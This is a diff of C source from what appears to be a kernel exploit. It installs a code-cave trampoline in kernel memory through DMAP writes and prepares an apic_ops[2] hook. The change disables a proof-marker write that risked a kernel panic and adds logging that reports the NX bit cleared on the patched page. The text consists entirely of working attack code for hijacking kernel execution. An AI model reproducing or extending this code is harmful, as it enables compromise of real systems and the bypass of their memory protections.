@@ -4226,20 +4226,19 @@ ring3_fallback:
                             g_kmod_trampoline_target = tramp_cave_kva +
                                                        CAVE_TRAMP_TARGET_OFF;
 
-                            /* Patch proof marker DMAP address into trampoline.
-                             * The trampoline writes CAVE_PROOF_MARKER to this
-                             * address when it fires, proving code execution
-                             * during resume. */
-                            uint64_t proof_dmap_addr = g_dmap_base + target_pa +
-                                                       CAVE_PROOF_OFFSET;
-                            kernel_copyin(&proof_dmap_addr,
-                                          g_dmap_base + tramp_cave_pa +
-                                          CAVE_TRAMP_PROOF_OFF, 8);
-
-                            /* Clear the proof location so we can detect fresh writes */
-                            uint64_t zero = 0;
-                            kernel_copyin(&zero,
-                                          g_dmap_base + target_pa + CAVE_PROOF_OFFSET, 8);
+                            /*
+                             * NOTE: proof marker DMAP write DISABLED.
+                             * g_proof_marker_addr left as 0 in the trampoline.
+                             * The trampoline's test rcx,rcx;jz skips the write.
+                             *
+                             * The DMAP write (same physical page as executing
+                             * code) may trigger x86 self-modifying code machine
+                             * clears during LAPIC suspend, causing kernel panic.
+                             * We'll detect trampoline firing by checking whether
+                             * apic_ops[2] still points to the cave trampoline
+                             * after resume instead.
+                             */
+                            (void)0; /* proof marker patching disabled */
 
                             printf("\n[+] ============================================\n");
                             printf("[+]  CAVE TRAMPOLINE INSTALLED\n");
@@ -4248,10 +4247,7 @@ ring3_fallback:
                                    (unsigned long)g_kmod_trampoline_func);
                             printf("[+] g_trampoline_target     = 0x%016lx\n",
                                    (unsigned long)g_kmod_trampoline_target);
-                            printf("[+] g_proof_marker_addr     = 0x%016lx\n",
-                                   (unsigned long)proof_dmap_addr);
-                            printf("[+] Proof location:  kdata+0x%x (writes 0x%016lx)\n",
-                                   CAVE_PROOF_OFFSET, (unsigned long)CAVE_PROOF_MARKER);
+                            printf("[+] Proof marker write:     DISABLED (SMC safety)\n");
                             printf("[+] Guest PTE NX permanently cleared for this page.\n");
                             printf("[+] Phase 7 can now arm apic_ops[2] hook.\n");
                         } else {
